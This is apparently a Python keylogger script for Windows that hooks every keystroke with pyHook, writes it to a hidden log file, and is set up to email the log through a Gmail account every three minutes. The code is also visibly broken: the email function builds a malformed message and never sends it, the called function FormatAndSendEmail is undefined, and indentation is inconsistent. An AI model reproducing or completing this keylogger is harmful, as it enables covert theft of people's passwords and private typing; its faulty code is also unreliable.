import pyHook, pythoncom, sys, logging
import time, datetime

wait_seconds = 180
timeout = time.time() + wait_seconds
file_log = 'C:\\keybaby\\dat.txt'


def TimeOut():
    if time.time() > timeout:
        return True
    else:
        return False
        
def SendEmail(user, pwd, recipient, subject, body):
     import smtplib
     
     gmail_user = user
     gmail_pass = pwd
     FROM = user
     TO = recipient if type(recipient) is list else [recipient]
     SUBJECT = subject
     TEXT = body
     message = """\From: %s\nTo: %\nSubject: %s\n\n%s
    
     """

def OnKeyboardEvent(event):
    logging.basicConfig(filename=file_log, level=logging.DEBUG, format = '%(message)s')
    logging.log(10, chr(event.Ascii))
    return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()

while True:
    if TimeOut():
        FormatAndSendEmail()
        timeout = time.time() + wait_seconds
      
     pythoncom.PumpWaitingMessages()
        
